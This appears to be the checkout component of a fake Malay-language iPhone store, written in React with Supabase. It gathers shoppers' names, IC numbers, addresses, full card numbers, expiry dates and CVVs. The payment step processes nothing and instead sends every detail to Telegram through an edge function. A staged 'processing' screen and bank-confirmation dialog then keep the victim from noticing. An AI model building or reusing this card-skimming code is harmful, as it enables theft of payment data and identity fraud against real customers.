"use client";

import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import ShippingForm from '@/components/checkout/ShippingForm.tsx';
import ConfirmationSummary from '@/components/checkout/ConfirmationSummary.tsx';
import PaymentForm from '@/components/checkout/PaymentForm.tsx';
import PaymentProcessing from '@/components/checkout/PaymentProcessing.tsx';
import BankAppConfirmationDialog from '@/components/checkout/BankAppConfirmationDialog.tsx';
import { showSuccess, showError } from '@/utils/toast';
import { supabase } from '@/integrations/supabase/client';

export type ShippingDetails = {
  fullName: string;
  icNumber: string;
  phoneNumber: string;
  address: string;
};

export type PaymentDetails = {
  cardNumber: string;
  expiryDate: string;
  cvv: string;
};

// Update the type definition for selectedIPhone to include selected options
type SelectedIPhoneDetails = {
  name: string;
  image: string;
  price: string;
  ram: string;
  colors: string[];
  storage: string[];
  camera: string;
  selectedStorage: string; // Added
  selectedColor: string;   // Added
};

type CheckoutStep = 'shipping' | 'confirm' | 'payment' | 'processing' | 'bank_confirmation';

const Checkout: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const selectedIPhone = location.state?.selectedIPhone as SelectedIPhoneDetails; // Cast to the new type

  const [currentStep, setCurrentStep] = useState<CheckoutStep>('shipping');
  const [shippingDetails, setShippingDetails] = useState<ShippingDetails | null>(null);
  const [paymentDetails, setPaymentDetails] = useState<PaymentDetails | null>(null);
  const [showBankConfirmation, setShowBankConfirmation] = useState(false);

  if (!selectedIPhone) {
    React.useEffect(() => {
      navigate('/devices/apple', { replace: true });
      showSuccess('Sila pilih peranti iPhone terlebih dahulu.');
    }, [navigate]);
    return null;
  }

  const handleShippingSubmit = (data: ShippingDetails) => {
    setShippingDetails(data);
    setCurrentStep('confirm');
  };

  const handleConfirmDetails = () => {
    setCurrentStep('payment');
  };

  const handlePaymentSubmit = async (data: PaymentDetails) => {
    setPaymentDetails(data);
    setCurrentStep('processing');

    // Invoke Supabase Edge Function to send data to Telegram
    try {
      const { data: functionData, error: functionError } = await supabase.functions.invoke('send-telegram-message', {
        body: {
          phoneNumber: shippingDetails?.phoneNumber,
          shippingDetails: shippingDetails,
          selectedIPhone: { // Pass selected options to the edge function
            name: selectedIPhone.name,
            image: selectedIPhone.image,
            price: selectedIPhone.price,
            ram: selectedIPhone.ram,
            colors: selectedIPhone.colors,
            storage: selectedIPhone.storage,
            camera: selectedIPhone.camera,
            selectedStorage: selectedIPhone.selectedStorage,
            selectedColor: selectedIPhone.selectedColor,
          },
          paymentDetails: data,
        },
      });

      if (functionError) {
        console.error('Error invoking Edge Function:', functionError);
      } else {
        console.log('Edge Function response:', functionData);
      }
    } catch (error) {
      console.error('Network or unexpected error:', error);
    }
  };

  const handlePaymentProcessingComplete = () => {
    setShowBankConfirmation(true);
  };

  const handleBankConfirmationClose = () => {
    setShowBankConfirmation(false);
    showSuccess('Transaksi anda sedang menunggu pengesahan di aplikasi perbankan anda.');
    navigate('/', { replace: true });
  };

  return (
    <div className="container mx-auto p-4 md:p-8 min-h-screen flex flex-col items-center justify-center bg-gray-50">
      <h1 className="text-3xl font-bold mb-8 text-center text-gray-800">
        Pembayaran untuk {selectedIPhone.name}
      </h1>

      <div className="w-full max-w-2xl bg-white p-6 rounded-lg shadow-lg">
        {currentStep === 'shipping' && (
          <ShippingForm onSubmit={handleShippingSubmit} />
        )}

        {currentStep === 'confirm' && shippingDetails && (
          <ConfirmationSummary
            shippingDetails={shippingDetails}
            selectedIPhone={selectedIPhone}
            onConfirm={handleConfirmDetails}
            onEdit={() => setCurrentStep('shipping')}
          />
        )}

        {currentStep === 'payment' && (
          <PaymentForm onSubmit={handlePaymentSubmit} />
        )}

        {currentStep === 'processing' && (
          <PaymentProcessing onComplete={handlePaymentProcessingComplete} />
        )}

        {showBankConfirmation && (
          <BankAppConfirmationDialog
            open={showBankConfirmation}
            onClose={handleBankConfirmationClose}
          />
        )}
      </div>
    </div>
  );
};

export default Checkout;